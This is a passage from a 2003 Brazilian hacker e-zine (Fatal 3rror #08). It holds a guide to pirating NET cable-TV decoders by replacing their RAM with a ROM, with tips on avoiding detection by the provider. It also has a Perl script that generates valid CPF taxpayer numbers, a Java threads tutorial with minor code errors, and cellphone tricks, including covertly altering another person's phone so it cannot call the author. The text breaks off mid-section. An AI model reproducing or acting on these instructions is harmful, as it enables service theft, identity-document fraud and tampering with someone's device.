Fatal 3rror(0008): Struck's job not found!

       .-==-------==----=----==------===---====-------==----=-.
       |                       FATAL 3RROR                    |
       |            ___________________________________       |
       |           /  _______________by_Cheat_Struck__/       |
       |          /  /______   /                              |
       |         /  _______/  /___   ___   __   ___           |
       |        /  /   /__   // o \ / o \ /  \ / o \          |
       |       /__/______/  // _  // _  // O // _  /          |
       |          /________// / \_\ / \_\\__// / \_\          |
       |                    )/    )/         )/               |
       |                    '     '          '                |
       |                                                      |
       |                < http://struck.8m.com >              |
       !                < cheat@struck.8m.com >               |
       |                                                      |
       |                                                      |
       |                                                      |
       '-----=--=-====--------==------=-------===-==------=---'



                .0. Edicao 08
                .0. ??/03/2003


  "E' soh da uma sumidinha e o povo ja pensa que nos tamo preso... =)"
                                                       Cheat Struck


   Topicos e Psicotropicos:

 .01. Introducao _____________.___________________by Cheat Struck
 .02. Pirateando tv a cabo ______________.._______by Cheat Struck
 .03. GeraCPF.pl________________._____.___________by pcHazard
 .04. Threads - Programacao Concorrente___________by Cheat Struck
 .05. Phr34k C33l T3kn33ks_______._._____.________by Cheat Struck
 .06. RMI____________.______________._______._____by Cheat Struck
 .07. Hackeando a PUCRS________._______.__________by Cheat Struck
 .08. JAVA BACKD00R____.__________________._______by Cheat Struck
 .09. Pane no Console______.______._._______,_____by Cheat Struck
 .10. ExpAll - versao inacabada________.________._by Cheat Struck
 .11. pcBot Lia1.6 - Manual do usuario______._____by Cheat Struck
 .12. Testsmtp_________..__________.______________by Cheat Struck
 .13. Very old bugs__________.______________._____by Cheat Struck
 .14. Internet Worm_.___________._________________by Cheat Struck
 .15. Super Eleet Programs____________.____._____.by Cheat Struck
 .16. Thiz the END________________________________by Cheat Struck









    ______
___/   __ \______
      ) _\_)_____)    01. Introducao
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Alou gurizada!!!
   Para os incredulos que nao acreditavam quando eu disse que eu voltaria, 
tae a prova. Depois de mais de um ano de espera, eu finalmente decidi 
juntar umas coisinhas aki para retomar a zine.
   A demora para o lancamento desta edicao e' justificavel. Mas nao e' da 
conta de voces portanto eu nao vou falar nada sobre isso.
   Quando eu decidi comecar a zine denovo, eu nao tinha muitas ideias 
sobre o que escrever e tinha perdido o contato com o pessoal que costumava 
colaborar. Por isso, eu publiquei alguns programas de minha autoria para 
preencher a zine.
   Soh que depois que comecei a faze-la, comecou a surgir um monte de 
ideias para as proximas edicoes, entao acho que a proxima vai sair mais em 
breve (nao e' uma promessa).
   Mais uma coisa...

   !!! AGORA EH IMPORTANTE (pelo menos pra mim)!!!
   Eu to no 5o semestre da pucrs e no momento estou desempregado. Se 
alguem tiver vaga na sua empresa, por favor entre em contato comigo.
   Meu curriculo voce pode conferir lendo a f3. =)
   Valeu! Curtam a zine...









    ______
___/   __ \______
      ) _\_)_____)    02. Pirateando tv a cabo
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Neste texto explicarei de forma simples o processo feito para burlar 
aparelhos decodificadores de tv a cabo NET. O segredo obviamente esta todo 
no hardware usado por estes aparelhos.
   Os aparelhos que veem junto qdo vc comeca a assinatura da NET, possuem
uma memoria RAM onde e' gravada toda a programacao dos canais. O que um
pirata faz e' simplesmente trocar a memoria RAM (Random Access Memory) por
uma ROM (Read Only Memory).
   
   A memoria RAM dos aparelhos e' programavel atravez de sinais enviados
pelo cabo da Net. Nesta memoria contem os canais e suas respectivas 
frequencias. Alem disso ainda e' gravado nesta RAM os canais preferidos
programados pelo usuario (sabe akeles que voce pode passar usando uma unica
tecla do controle?? Normalmente esta o sportv, cartoon network, fox, etc).
   E' assim que quando se compra um canal pay-per-view ele simplesmente eh 
programado na RAM por sinais enviados pelo cabo e nao necessita que um 
tecnico da net va a sua casa e reprograme fisicamente o aparelho. Quando o 
prazo da compra do canal expira, novamente a RAM eh reprogramada para que 
o canal nao possa mais ser exibido.

   Na RAM ainda deve conter uma chave decodificadora de canais para que o 
sinal nao possa ser recebido por aparelhos de video-cassete ou tvs que 
possam acessar as frequencias mais altas usadas pelos canais da net.
   Nota: em cidades do interior algumas centrais da net nao codificam os 
canais e estes podem ser acessado simplesmente ligando o cabo da net na 
entrada de antena da tv ou video e entao sintonizar os canais.

   Mas como podemos obter todos os canais pagos (inclusive o playboy e o 
sexy hot)??
   Facil... O pirata simplesmente compra todos os canais. Uma vez com toda 
a RAM programada ela eh copiada para uma ROM e esta eh instalada nos 
aparelhos no lugar da RAM. Assim todos os canais estarao programados e nao 
podem ser reporgramadas pois (caso voces nao saibam) ROMs nao sao 
regravaveis. =)

   As consequencias de se colocar uma ROM no lugar de uma RAM eh o fato de 
nao poder mais programar os canais favoritos do usuario assim como 
mudancas feitas pela operadora da net na numeragem dos canais tambem nao 
ira fazer efeito no aparelho pirateado.
   Ou seja o Fox Kids Network ha algum tempo atras era o canal 55, depois 
mudou para 34 e agora eh o 45. Se a burlagem fosse feita quando o canal 
era o 55, hoje ele ainda seria recebido no 55.

   O problema maior agora eh: "Tem como os cara me pegar fazendo isso?"
   Ja teve gente que foi pega pela seguinte razao... Os cara compravam um 
aparelho pirata ou mandavam burlar um aparelho normal e entao paravam de 
pagar pelo servico da net. 
   Os cara da net desconfiavam que a pessoa ainda ficava acessando os 
canais mesmo sem estar recebendo sinal nenhum por ele e entao um tecnico 
ia a casa da pessoa checar a hipotese com a historia de que foi mandado 
para recolher o aparelho por falta de pagamento. Entao descobria-se a 
trambicagem.

   Nao eh procedimento da net recolher os aparelhos quando a pessoa 
encerra sua assinatura, pois voce pagou por ele quando comecou a pagar 
pelo servico e alem disso eh comum acontecer da pessoa depois de se 
acostumar com a tv por assinatura, nao conseguir ficar muito tempo soh com 
canais da tv aberta e voltar a pagar pelo servico.
   Logo, se algum tecnico vai a casa de alguem recolher o aparelho por 
falta de pagamento eh por alguma disconfianca de piratagem.
   O que eh aconselhavel fazer entao eh ao comprar um aparelho pirata ou 
piratear um, continue pagando pelo servico mais barato da net. Assim voce
pode ter todos os pay-per-views e canais do pacote avancado pagando uma
miseria por mes. O cabo da net eh semelhante a um cabo de antena e soh 
recebe sinal nao envia, portanto nao ha como ha como descobrirem quais 
canais vc esta acessando e voce nao corre o risco.










    ______
___/   __ \______
      ) _\_)_____)    03. GeraCPF.pl
     / (____)             by pcHazard
      (_____)
--\___(____)


   Bom... (Quem ta falando e' o struck). Como o pcHazard ta muito ocupado
(fazendo nao sei o que), vou publicar umas coisinhas que ele codou e me
mandou faz um tempo... Nao era com o objetivo de publica-las mas achei que
seria uma boa, ja que a falta de material era grande para essa edicao.

   Este e' um programa que usa um algoritmo simples de geracao de numeros
de cpf randomicos.


<++> geracpf/geracpf.pl
#!/usr/bin/perl
#Gerador de CPF
#2002 by pcHazard <cybercrash@ig.com.br>

print STDERR "-[+]--------------------------------[+]-\n";
print STDERR "          CPFuckYou by pcHazard\n";
print STDERR "-[+]--------------------------------[+]-\n";

$cpfs = $ARGV[0] || 1;

@numeros = ('0' .. '9');

for ($i=1;$i <= $cpfs; $i++)
{
   $numero = '';
   for $x (1 .. 9)
   {
      $numero .= $numeros[rand @numeros];
   }
   $digito = calcula_digito_cpf($numero);
   $numero_final = "$numero$digito";
   $numero_final = substr($numero_final,0,3).".".substr($numero_final,3,3).".".substr($numero_final,6,3)."-".substr($numero_final,9,2);
   print "$numero_final\n";
}


sub calcula_digito_cpf
{
   $numcpf = $_[0];
   die "duh!" if (length($numcpf) != 9);
   @cpf = split('', $numcpf);
   $soma1 = ($cpf[0] * 10) +
            ($cpf[1] * 9) +
            ($cpf[2] * 8) +
            ($cpf[3] * 7) +
            ($cpf[4] * 6) +
            ($cpf[5] * 5) +
            ($cpf[6] * 4) +
            ($cpf[7] * 3) +
            ($cpf[8] * 2);
   $resto = $soma1 % 11;
   if ($resto < 2)
   {
      $digito1 = 0;
   }
   else
   {
      $digito1 = (11 - $resto);
   }
   $soma2 = ($cpf[0] * 11) +
               ($cpf[1]  * 10) +
               ($cpf[2]  * 9) +
               ($cpf[3]  * 8) +
               ($cpf[4]  * 7) +
               ($cpf[5]  * 6) +
               ($cpf[6]  * 5) +
               ($cpf[7]  * 4) +
               ($cpf[8]  * 3) +
               ($cpf[9] * 2);
   $resto = $soma2 % 11;
   if ($resto < 2)
   {
      $digito2 = 0;
   }
   else
   {
      $digito2 = (11 - $resto);
   }
   return ("$digito1$digito2");
}

<-->










    ______
___/   __ \______
      ) _\_)_____)    04. Threads - Programacao Concorrente
     / (____)             by Cheat Struck
      (_____)
--\___(____)


   Nesta materia irei demonstrar a utilizacao de threads em um ambiente
java (pra variar um pouco... soh vemos C e perl desde que comecou a zine).


Indice
------
   1. Introducao
   2. Nocoes basicas de java
    2.1. Classes e objetos
    2.2. Heranca e interfaces
    2.3. Metodos publicos e privados
   3. Criando um Thread
   4. Controlando a execucao do Thread
   5. Prioridades
   6. Threads Sincronizados
    6.1. Metodos synchronizeds
    6.2. wait(), notify() e notifyAll()
   7. DeadLock
   8. Conclusao



1. Introducao
-------------
   Um programa comum geralmente segue um unico fluxo de execucao. No 
entanto as vezes e' necessario utilizar uma execucao paralela de varias 
instrucoes como no caso de um servidor de http que precisa atender a 
diversos clientes ao mesmo tempo.
   Programacao concorrente conceitua metodos de um programa seguir 
diversos fluxos de execucao. Para tal coisa existem os chamados processos
leves tambem conhecidos como threads.
   Threads sao conhecidos como processos leves porque sao linhas de execu-
cao que rodam simultaneamente em um processo. Eles nao sao carregados na
memoria secundaria como processos normais pois o codigo ja se encontra na
memoria principal.
   Obviamente voce sabe que nao e' possivel executar diversas instrucoes
em paralelo num processador. Portando o conceito de programacao concorrente
nao faz exatamente uma execucao de diversos fluxos em paralelo. Porem um
processo pode estar sendo executado pelo processador ou esperando alguma
resposta de operacoes mais lentas, como operacoes de io(entrada/saida).
   Threads sao executadas praticamente simultaneamente, pois aproveitam
esse modo de espera de uma thread para execucao de outra.
   Bem.. acho que ja deu pra entender o que sao threads. Agora vamos por
um pouco em pratica...



2. Nocoes basicas de java
-------------------------
   Como neste texto decidi introduzir uma nova linguagem a fatal3rror,
me achei meio q na obrigacao de dar alguma nocao basica de java para
que leitores nao familiarisados `a esta linguagem, possam entender os
exemplos bem como os conceitos que serao explicados no decorrer desta
materia.
   Nao pretendo me aprofundar muito aki, soh dar uma pequena base para
nao boiarem totalmente nos codes. Assim se voce se interessar nesta
linguagem, q anda dando emprego pra muita gente ae, aconselho buscar um
tutorial mais aprofundado.

   Presumo que vc leitor ja tenha um conhecimento basico sobre java, 
assim como esta ser orientada a objetos e interpretada atravez de 
byte-codes (.class), portanto vou me prender somente a nocoes de
programacao.
   Java eh semelhante a C em muitos aspectos, logo nao eh preciso 
falar muito sobre a montagem de um codigo fonte pois se vc ja codou
em C vai entender muito do code em java.



2.1. Classes e objetos
----------------------
   A principal diferenca se da ao fato de que java sendo orientada a
objetos, necessita que sejam criadas classes para estes. Um exemplo
de classe seria:

class SuperHeroi {
   public SuperHeroi() {
   }
   //conteudo da classe...
}

   Dentro da classe sao definidos os metodos a serem usados nesta. 
Metodos podem ser grosseiramente comparados a funcoes em C. Como
por exemplo, em C usavamos a funcao main() para iniciar nosso 
programa, enquanto em Java usamos o metodo main(). Lendo os codes
a seguir voce notara' a semelhanca.
   Um metodo que sempre deve aparecer na classe eh chamado o metodo
construtor. Ele recebe o mesmo nome da classe (como vemos no nosso
exemplo). Quando formos criar um objeto desta classe devemos inicia-lo
chamando o metodo construtor. Por exemplo:

...
   SuperHeroi batman, spiderman, iceman;  //Declara os objetos...
   batman    = new SuperHeroi();          //Cria o objeto batman
   spiderman = new SuperHeroi();          //Cria o objeto spiderman
   iceman    = new SuperHeroi();          //Cria o objeto iceman
...

   Os objetos batman, spiderman e iceman sao todos da classe SuperHeroi.




2.2. Heranca e interfaces
-------------------------
   E' possivel criar classes que herdam caracteristicas de outras classes
ja existentes. Isto eh conhecido como heranca.
   Por exemplo:

class Xmen extends SuperHeroi { 
  //... 
}
class LigaDaJustica extends SuperHeroi {
  //...
}
class Fantastic4 extends SuperHeroi { 
  //... 
}

   As classes Xmen, LigaDaJustica e Fantastic4 todas possuem caracteristicas
em comum, herdadas da classe SuperHeroi. Isso significa que todos os metodos
e atributos declarados na classe SuperHeroi foram herdados nas novas classes. 
   Isto caracteriza Java tambem por polimorfismo. Ou seja, um objeto
pode assumir a forma de varios objetos herdeiros dele. Exemplo:

...
   SuperHeroi wolverine, aquaman, coisa;         //Declara os objetos...
   wolverine = new Xmen();                       //cria objeto wolverine
   aquaman   = new LigaDaJustica();              //cria objeto aquaman
   coisa     = new Fantastic4();                 //cria objeto coisa
...

   Note que os 3 objetos declarados como SuperHeroi tomaram diferentes formas.
wolverine eh um objeto da classe Xmen, aquaman eh da classe LigaDaJustica e
coisa, Fantastic4.
   Mesmo assim todos sao "SuperHeroi"s. =)

   Entretando Java permite apenas herancas simples. Logo uma classe nao pode
ser herdeira de 2 ou mais classes. Isto nos leva a usar interfaces.
   Interfaces sao um conjunto de metodos/atributos semelhantes `a classes
porem que nao "tem vida propria". Quer dizer... nao podemos criar um objeto
a partir de uma interface.
   Logo, a grosso modo podemos dizer q interfaces sao classes feitas somente
para serem herdadas e nao podem ser usadas sozinhas.
   Exemplificando:

interface VisaoRaioX {
   //...
}
interface SuperForca {
   //...
}
interface SerVerde {
   //...
}

   Para implementa-las nas classes fazemos:

class SuperHomem extends SuperHeroi 
implements VisaoRaioX, SuperForca
{
   //...
}
class Hulk extends SuperHeroi 
implements SuperForca, SerVerde
{
   //...
}

   Note que as classes acima alem de implementarem as interfaces que criamos,
tambem herdam a classe SuperHeroi. Logo, interfaces devem ser usadas somente
para complementar a heranca.





2.3. Metodos publicos e privados
--------------------------------
   Voce vai notar uma sutil diferenca entre a declaracao de metodos em java
e de funcoes em C. As palavras "public" ou "private" aparecendo antes do 
tipo de dado de retorno.
   Exemplo:

class Algebra {
   //...
   public int calcula(int a, int b) {
      //...
   }
   private int distancia(int a, int b) {
      //...
   }
}

   Isso eh bem simples. Metodos declarados como public podem ser chamados
por outros objetos enquanto os privates sao restritamente usados pelo
proprio objeto. 
   No caso, o metodo calcula poderia ser chamado da seguinte forma:

...
   int i;
   Algebra a = new Algebra();                   //Cria o objeto a
   i = a.calcula(10, 25);                       //Chama o metodo calcula
...

   Entretanto o metodo distancia soh pode ser usada na propria classe
Algebra. Exemplo seria usa-la dentro do metodo media:

...
   public int calcula(int a, int b) {
      int i;
      i = distancia(a,b);
      return i;
   }
...

   Isto tambem aplica-se a atributos da classe (variaveis globais da classe).
   Acho que o basico ja foi passado. Com isso ja da pra pelo menos ter ideia
de como os programas irao funcionar. Volto a dizer que se quizer aprender
mais sobre java va ler um livro ou um tutorial sobre isso pq nao vou mais
dar essas aulas extras.




3. Criando um Thread
--------------------
   Assim como em todo o universo java, ha varios meios diferentes de se
chegar ao mesmo resultado(criar uma thread). Este eh o principal motivo
de muitos considerarem Java uma linguagem dificil de se compreender.
   A dica pessoal que passo eh nao tentar simplificar muito as coisas e
seguir sempre o mesmo caminho para criar as coisas.
   Voce podera encontrar em outros textos, metodos mais simples do que o
que vou explicar aqui, porem estes talvez nao se apliquem a qualquer 
situacao. Entao ao invez de tentar decorar dezenas de metodos simples
para executar tal coisa, decore apenas o metodo um pouco mais complicado
que, porem, aplica-se a qquer caso.
   Espero que apos a introducao a Java voce ainda lembre-se do conceito
de threads. Se nao, volte a introducao e releia-a.

   Para criarmos um thread precisamos basicamente carregar o metodo run
com os comandos que a thread ira executar. O metodo run eh definido na
interface Runnable.
   Apos criarmos o thread, para comecar a roda-lo usamos o metodo start.
   Vejamos nosso primeiro programa teste:


<++> threads/Test1.java
class RunExemplo implements Runnable {
   private int n;
   public RunExemplo(int i) {
      n = i;
   }
   public void run() {
      int i;

      for(i = 0; i < 10; i++) {
         System.out.println("Thread " + n + " - run " + i + " times.");
         try{
           Thread.sleep((long)Math.random()*1000);
         }catch(InterruptedException e) {}
       }
       System.out.println("Thread " + n +" - Done!");
  }
}

class Test1 {
   public static void main(){
      Thread t1,t2;
      t1 = new Thread( new RunExemplo(1) );
      t2 = new Thread( new RunExemplo(2) );

      t1.start();
      t2.start();
   }
}

<-->

   Compile e rode o Test1.class para notar como os 2 threads
realmente sao executados ao mesmo tempo (ou pelo menos aparentam
que sim).
   Alguns detalhes devem ser reparados aqui: 
   Primeiro, note o uso do try-catch no metodo run. Ele eh usado aqui pq
quando brincamos com threads temos sempre que "tentar" executar funcoes
pois a thread pode estar atualmente processando uma instrucao demorada 
ou um sleep que ainda nao tenha acabado, entao nao deve executar a
proxima funcao e sim "tentar" (try) executa-la.
   Segundo, os Threads t1 e t2 sao criados porem so' comecam a ser 
executados quando o metodo start delas eh chamado. Antes disto eles apenas
existem na memoria como 2 objetos criados.



   
4. Controlando a execucao do Thread
-----------------------------------
   Quando usamos threads temos que cuidar para nao deixa-los executarem
todos ao mesmo tempo caso as operacoes executadas por um deles dependa
do resultado de outro.
   Para controlar quando uma thread acaba usamos o metodo join deste.
   Exemplo:

...
   Thread t1,t2,t3;
...
   t1.start();
   t2.start();
...
   try {
      t1.join();
      t2.join();
   } catch(InterruptedException e) {}
   t3.start();
...

   As threads t1 e t2 serao executadas simultaneamente, assim como os
outros comandos do metodo que os chama. Quando chegamos entao a instrucao
t1.join() o metodo chamador espera que a thread t1 acabe de ser executada
entao passa a proxima instrucao, t2.join(), esta espera que a thread t2
acabe e somente entao inicia a thread t3.



5. Prioridades
--------------
   Ate' agora soh vimos que 2 ou mais threads podem ser executadas ao
mesmo tempo. O que nao sabemos eh como a JVM faz o escalonamento das
threads para que sejam executadas simultaneamente em um unico processador.
   O algoritmo de escalonamento usado eh colocar todas as threads em
filas segundo sua prioridade. A prioridade eh herdada da thread que a
criou.
   Exemplificando, se existem 2 filas de prioridade, as threads de 
prioridade mais alta sao colocadas na primeira fila e as mais baixas
na segunda. 
   A JVM pega a primeira thread da fila 1 e executa-a ateh que caia em
uma funcao que a faca dormir (seja por esperar resposta de outros 
dispositivos da maquina ou por funcoes sleep), entao joga esta thread 
para o final da fila e executa a proxima ate' que todas sejam executadas.
   Caso todas as threads da fila 1 estejam durmindo ou encerradas, entao
passa-se a executar as threads da fila 2.

   A prioridade das Threads podem ser alteradas como visto no proximo ex:

...
   Thread t1,t2,t3,t4;
...
   t1.setPriority(2);
   t2.setPriority( t1.getPriority() );
   t3.setPriority(MAX_PRIORITY);
   t4.setPriority(MIN_PRIORITY);
...

   O que vemos acima eh, as threads t1 e t2 sao jogadas na mesma fila de
prioridade 2, t3 eh jogada na fila de prioridade maxima (MAX_PRIORITY eh
uma constante que define o maximo de prioridade que uma thread pode receber)
e t4 eh jogada na thread de prioridade minima (MIN_PRIORITY tambem eh uma
constante ja definida como minimo de prioridade).
   Entao teremos 3 filas. Embora todas as 4 threads tenham como objetivo
ser executadas simultaneamente, a preferencia sera da thread t3 e a menos
importante sera a t4.
   Assim, se todas as threads estiverem prontas para serem executadas, quem
sera executada sera a t3. Quando t3 durmir, t1 e t2 serao executadas. Se ambas
durmirem, somente entao t4 sera executada. Se em qualquer momentoa thread t3
acordar, o fluxo de execucao passa para ela novamente.

   Uma thread tambem pode simplismente forcar-se a ir para o final de sua fila
usando o metodo yield().




6. Threads Sincronizados
------------------------
   O grande problema em usar threads eh qdo duas ou mais threads concorrentes
operam sobre a mesma area de dados. Ja vimos uma situacao parecida em race
conditions (f3-06).
   O exemplo a seguir mostra como pode ocorrer falhas de buffer overwrite
(sobrescrita de dados) em um programa java atravez de threads nao-
sincronizadas.

<++> threads/Test2.java
class TheBuffer {
                                        //(final define constantes)
   private final int LEN = 1500;        //tamanho do buffer
   private int buff[], t;

   public TheBuffer() {
      buff = new int[LEN+1];
      t = 0;
   }
   public void add(int val) {
      int i;

      i=t++;
      for(; t>0 ;) 
         buff[t] = buff[t--];
      buff[0]=val;
      t=i;
   }
   public void getLen() {
      System.out.println("Tamanho do buffer = " + t);
   }
}

class TheKode implements Runnable {
   private TheBuffer tb;

   public TheKode(TheBuffer b) {
      tb=b;
   }
   public void run() {
      int i;
      for(i=0; i<500; i++)
         tb.add(i);
      System.out.println("Thread Encerrada!");
      tb.getLen();
   }
}

class Test2 {
   public static void main() {
      TheBuffer tb;
      Thread t1,t2,t3;

      tb = new TheBuffer();                 //Cria TheBuffer...
      t1 = new Thread( new TheKode(tb));    //Cria Threads...
      t2 = new Thread( new TheKode(tb));
      t3 = new Thread( new TheKode(tb));

      t1.start();                           //Roda as threads...
      t2.start();
      t3.start();
   }
}
<-->

   No Programa acima temos 3 classes simples.
   Nossa classe principal (que contem o main) eh a Test2. Ela cria um objeto
da classe TheBuffer e passa-o por referencia para a execucao de 3 Threads
iguais.
   A classe que implementa o que sera executado pela Thread eh a TheKode.
O que o codigo faz eh inserir numeros de 1 a 500 no nosso buffer.
   A classe TheBuffer eh referente a area de dados compartilhada pelas threads.
O objeto criado por esta classe possui o metodo add(), que adiciona valores
inteiros ao vetor, e o metodo getLen(), que mostra o tamanho atual do buffer.

   Note que a rotina de insercao eh do tipo pilha. Ou seja, o ultimo numero
inserido vai para o inicio do vetor. Isso faz com que toda a vez que um
numero eh inserido, todos os valores atuais do vetor sejam passados para o
indice seguinte.
   Note tambem que 3 threads sao criadas, cada uma insere 500 inteiros no vetor
portanto ao final da execucao o tamanho do buffer deve ser 1500.

   Compile e execute diversas vezes e logo voce notara os problemas.
   Quando a thread 1 estiver inserindo um valor no buffer, seu tempo de
execucao pode encerrar-se antes deste completar a sequencia de empilhamento.
Sendo assim quando a thread 2 executar o a insercao sobre o mesmo objeto,
este estara instavel pois nao foi completado durante a thread 1.
   Caso voce tenha um puta processador, aumente os valores de insercao de 
0 a 1000 ou 10000 na classe TheKode, lembrando tambem de aumentar o tamanho
do buffer na classe TheBuffer.




6.1. Metodos synchronizeds
--------------------------
   O que deveria acontecer no programa acima para que nao ocorrese erro eh
bastante obvio. O metodo add() deveria ser executado sem interrupcoes, de
forma atomica.
   Java implementa na linguagem um modificador que parece ter sido 
especialmente para problemas com threads. Todo o metodo definido como
synchronized eh executado inteiramente sem interrupcoes. Estes blocos
sao chamados de secoes criticas, pois soh permitem que sejam executados
novamente quando terminarem.
   Toda a classe TheBuffer poderia ser declarada como synchronized porem
nao ha necessidade disso visto que apenas o metodo add() que gera uma 
falha. Entao corrija no Test2.java a declaracao do add() para que seja
uma secao critica.

   public synchronized void add(int val) {

   Compile e execute novamente verificande se a mesma falha ocorre.



6.2. wait(), notify() e notifyAll()
-----------------------------------
   Quando uma classe possui um metodo definido como synchronized, eh
automaticamente criado 3 novos metodos nesta classe. Sao eles:

wait()      - Joga a thread numa fila de espera.
notify()    - Acorda uma thread que esta na fila de espera.
notifyAll() - Acorda todas as threads que estao na fila de espera.

   Estes metodos sao usados normalmente para fazer o controle de threads
sincronizadas. Por exemplo, no Test2.class, mesmo com o add sincronizado,
os valores no buffer serao colocados de forma desordenada pois nao ha
como prever qual thread sera executa anteriormente. De forma que como
cada thread coloca valores de 0 a 500, no fim nosso buffer estaria +/-
assim:

1,1,1,2... 50,49,50,51,50,51... 378,401,379,380,402,360,361,... 500

   Podemos fazer com que o buffer seja completado de forma ordenada
alterando no programa Test2 classe TheBuffer:


<++> threads/TheBuffer.java
class TheBuffer {
   private final int LEN = 1500;
   private int buff[], t, n;

   public TheBuffer() {
      buff = new int[LEN+1];
      t = n = 0;
   }
   public synchronized void add(int val) {
      int i;

      while (n > 0 && val != buff[t]) {
         try {
            wait;
         } catch (InterruptedException e) {}
      }

      i=t++;
      for(; t>0 ;) 
         buff[t] = buff[t--];
      buff[0]=val;
      t=i;

      n++;
      if (n > 2) {
         n=0;
         notifyAll();
      }
   }
   public void getLen() {
      System.out.println("Tamanho do buffer = " + t);
   }
   public void showBuff() {
      int i;
      for (i=0; i <= t; i++)
         System.out.println(buff[i] + ", ");
   }
}
<-->


   Substitua a classe no projeto de Test2 e qdo encerrar os 3 threads execute
o novo metodo showBuff() que exibe como ficou o buffer. Lembre-se de usar join()
para verificar o fim de execucao das 3 threads.
   Note que nesta classe utilizamos um 3a atributo privado (n) que controla o
numero de vezes que o mesmo numero sera inserido no buffer (como sao 3 threads,
cada numero se repete 3x). Enquanto este numero for maior q 0, o metodo soh
sera executado quando os valores a serem inseridos sejam iguais ao ultimo. 
   Caso contrario a thread que tentou inserir um valor diferente do ultimo vai
para a lista de espera.
   Quando chega ao final do bloco n eh incrementado e caso seja maior que 2
(significa que as 3 threads inseriram o mesmo valor), ele eh zerado e o metodo
notifyAll() eh chamado, acordando todas as threads que ficaram na lista de
espera.
   O resultado do nosso buffer ficaria sempre:

1,1,1,2,2,2,...44,44,44,45,45,45,46,46,46...,394,394,394,395,395,395,...500

   Em alguns casos pode ocorrer dos valores nao ficarem ordenados, porem
sempre estarao na sequencia de 3 em 3.



7. DeadLock
-----------
   Situacoes conhecidas como deadlock eh quando o programa coloca todas as
threads na fila de espera e por algum motivo nunca eh chamado o metodo
notify.
   Isso deixaria o programa trancado pois ainda ha coisas a serem executadas
porem estao todas esperando sua vez.
   Para testar tal situacao, altere no ultimo metodo (TheBuffer) a linha que
zera o atributo n. Assim todas as threads serao trancadas ao tentarem inserir
o valor 2 no buffer. Isso pq caem no condicional de loop que acaba trancando-os
na lista de espera.




8. Conclusao
------------
   Por fim, vimos que threads sao ferramentas indispensaveis em sistemas 
multitarefas, porem que esta muito sujeita a erros de programacao que
passam desapercebidos por muitos programadores.
   Programas daemons de servicos tcp normalmente usam threads ou sistemas
parecidos (como fork) para atenderem a diversos clientes simultaneamente,
portanto a descoberta de falhas nestes podem resultar em remote shells.
   Alem disso, todo o sistema multitarefa se utiliza de threads para que
diversos programas executem ao mesmo tempo portanto ainda deve existir uma
vasta lista de vulnerabilidades nestes.










    ______
___/   __ \______
      ) _\_)_____)    05. Phr34k C33l T3kn33ks
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Nota: Tudo o que e' falado foi testado num Nokia 5125i.

1. cHAMADAS DE eMERGENCIA
-------------------------
   Isso seria uma tekneek para fazer ligacoes de graca. Ouvi dizer que
ate' funciona no Canada, mas aki nao da muito certo nao.
   Nos aparelhos, ja meio antigos, como os Gradiente strike e nokias
anteriores ao 5125 (nao me perguntem quais os q funciona pq nao decoro
essas porra) voce usava akele velho code para entrar no menu de selecao
das NAM, Security No, Emergency No, Serial, etc...
   Basta digitar:

*3001#12345#

   Agora selecione os numeros de emergencia (Normalmente ha 3 ou 5 numeros
e por default sempre vem o 190 no primeiro). Ali devera ser colocados
os numeros em que os canadenses irao ligar de graca.
   Tente ligar para o numero que voce colocou ali e pah! Aparecera a msg
de que um numero de emergencia foi chamado e a ligacao eh encerrada antes
mesmo de comecar. Nao da nem pra dar toque no numero que voce discou.
   Entao a moral eh essa. Se voce tiver problemas com alguem que vive te
ligando (como no meu caso com uma pentelha q vivia me dando toque) pedi
para olhar o cell dela e coloque seu numero nas chamadas de emergencia e
relaxe pois ela nunca mais vai lhe encomodar.
   Q merda de tekneek heim?



2. R1ngT0n3s
------------
   Para baixar um toque na internet voce pode optar por pagar uma 
taxa a alguma empresa que vai lhe enviar o ringtone, ou pegar de graca
por varias paginas por ae.
   Os ringtones nao passam de mensagens que comecam por //SCKL (que 
identifica a msg como sendo um ring tone e nao uma mensagem comum.
   Um exemplo de mensagem ringtone eh:

//SCKL15811581040301 024A3A65CD98C97DD1A5D1B1940414A4990BE6185D06106

   Ae a primeira coisa que voce pensa eh: "Vou no site da minha operadora
e mando essa mensagem pra mim de la! Como eu sou inteligente!".
   O problema eh que algumas (quase todas) operadoras de celular barram
mensagens de ringtones mandadas pelas suas paginas.
   A saida aki eh tirar o //SCKL do inicio da menssagem e mandar apenas
os numeros hexadecimais que compoem a musica. Quando voce receber, edite
a mensagem e coloque o //SCKL no inicio dela, entao mande para si mesmo.
   Ha ringtones que sao compostos de mais de uma mensagem, mande parte
por parte para si mesmo (sempre iniciando com //SCKL). 
   No final voce soh pagara' pelo custo do envio de mensagem (que sai
em torno de 0,20 centavos).
   Isso ae.


3. 12345
--------
   Sabem aquele famoso codigo para entrar no menu especial de selecao
de NAM entre outras coisas? Relembrando...

* 3 0 0 1 # 1 2 3 4 5 #

   Sabe esse numero dificil de decorar que vem depois do *3001# ??? Ele
e' apenas o numero que vem programado por padrao nos celulares que vem
direto da fabrica. 
   Sabe akele seu amigo que tem um celular do mesmo modelo do seu e que
usou esse codigo pra trocar o nome que aparece la onde esta escrito
"Sist. de origem" no seu, ja que no seu celular esse codigo nao 
funciona...
   Pois e'... acontece que esse numero pode ser reprogramado e algumas
operadoras (como a Telefonica celular) alteram esse numero por algum
motivo. Talvez pq assim seus usuarios tenham que ir a uma loja para
colocarem seus nomes na tela principal e assim aproveitem que estao ali
para comprar cartoes para seus pre-pagos. Ou sei la... para que seus
usuarios nao facam merda mudando seus numeros achando que assim 
clonaram seus telefones.
   Bem... resumindo... esse numero e' reprogramavel. Voce pode 
descobri-lo ligando seu celular no comp e usando akeles programinhas
que o pessoal usa para mudar as imagens de abertura e dos menu de seus
telefones.


4. 1d3i4 `a ser p3squizada
--------------------------
   A ideia e' o seguinte... Voce ja mandou uma mensagem para voce mesmo
ou para alguem enviando um ring-tone ao invez de um texto??
   Voce percebeu que os ring-tones nada mais sao do que mensagens que
comecam com //SCKL e quando recebidas pelo celular sao reconhecidas 
automaticamente como ring-tones e nao como mensagens de texto?
   Pois bem... voce sabia que e' possivel alterar o tag-name (nome que
aparece no menu principal) remotamente? Issu ja aconteceu com conhecidos
ao passarem perto de uma antena da operadora de outras cidades, e em
outros casos. O tag-name simplesmente mudou para algo relacionado a
operadora como "Claro Digital" (Nao lembro direito o que aparecia 
escrito).
   A ideia e' que essa entre outras coisas, sejam feitas atravez de 
